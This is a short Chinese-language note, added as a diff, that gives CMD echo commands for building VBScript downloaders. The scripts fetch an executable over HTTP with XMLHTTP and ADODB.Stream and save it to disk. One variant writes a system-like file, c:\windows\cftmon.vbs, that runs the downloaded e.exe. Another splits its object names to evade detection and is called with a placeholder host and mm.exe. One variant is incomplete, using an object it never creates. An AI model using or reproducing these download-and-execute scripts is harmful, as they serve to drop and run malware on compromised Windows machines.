@@ -1,0 +1,41 @@
+CMD下执行VBS下载脚本 
+
+
+在CMD中一条一条地敲如下语句：
+echo Set xPost = CreateObject("Microsoft.XMLHTTP") >down.vbs 
+echo xPost.Open "GET","http://127.0.0.1/exe",0 >>down.vbs 
+echo xPost.Send() >>down.vbs 
+echo Set sGet = CreateObject("ADODB.Stream") >>down.vbs 
+echo sGet.Mode = 3 >>down.vbs 
+echo sGet.Type = 1 >>down.vbs 
+echo sGet.Open() >>down.vbs 
+echo sGet.Write(xPost.responseBody) >>down.vbs 
+echo sGet.SaveToFile "tt.exe",2 >>down.vbs
+
+之后输入"cscript down.vbs"就执行了down.vbs
+
+下载了tt.exe
+
+4、vbs 下载者
+1
+echo Set sGet = createObject("ADODB.Stream") >>c:\windows\cftmon.vbs
+echo sGet.Mode = 3 >>c:\windows\cftmon.vbs
+echo sGet.Type = 1 >>c:\windows\cftmon.vbs
+echo sGet.Open() >>c:\windows\cftmon.vbs
+echo sGet.Write(xPost.responseBody) >>c:\windows\cftmon.vbs
+echo sGet.SaveToFile "c:\windows\e.exe",2 >>c:\windows\cftmon.vbs
+echo Set objShell = CreateObject("Wscript.Shell") >>c:\windows\cftmon.vbs
+echo objshell.run """c:\windows\e.exe""" >>c:\windows\cftmon.vbs
+cftmon.vbs
+
+2
+On Error Resume Next:Dim iRemote,iLocal,s1,s2
+iLocal = LCase(WScript.Arguments(1)):iRemote = LCase(WScript.Arguments(0))  
+s1="Mi"+"cro"+"soft"+"."+"XML"+"HTTP":s2="ADO"+"DB"+"."+"Stream"
+Set xPost = CreateObject(s1):xPost.Open "GET",iRemote,0:xPost.Send()
+Set sGet = CreateObject(s2):sGet.Mode=3:sGet.Type=1:sGet.Open()
+sGet.Write(xPost.responseBody):sGet.SaveToFile iLocal,2
+
+cscript c:\down.vbs http://xxxx/mm.exe c:\mm.exe
+
+ 
